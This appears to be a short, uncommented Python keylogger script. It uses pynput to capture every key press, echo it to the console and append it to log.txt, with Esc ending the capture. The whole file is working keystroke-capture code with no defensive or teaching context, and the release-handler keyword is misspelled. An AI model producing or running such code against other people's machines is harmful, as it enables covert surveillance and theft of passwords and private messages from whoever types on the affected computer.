

from pynput.keyboard import Key , Listener



def on_press (key):

    print("{0} pressed".format(key))

    write_file(key)


def write_file(keys):
    with open("log.txt","a")as f :

        k=str(keys).replace("'","")

        if k.startswith("Key.space"):
                f.write('\t')
                f.write(k)
                f.write('\t')
        elif k.startswith("Key"):
                f.write("\n")
                f.write(k)
                f.write('\t')
        else:
            f.write(k)




def on_release(key):
    if key == Key.esc:
        return False




with Listener(on_press=on_press,on_realese=on_release) as listener:
    listener.join()















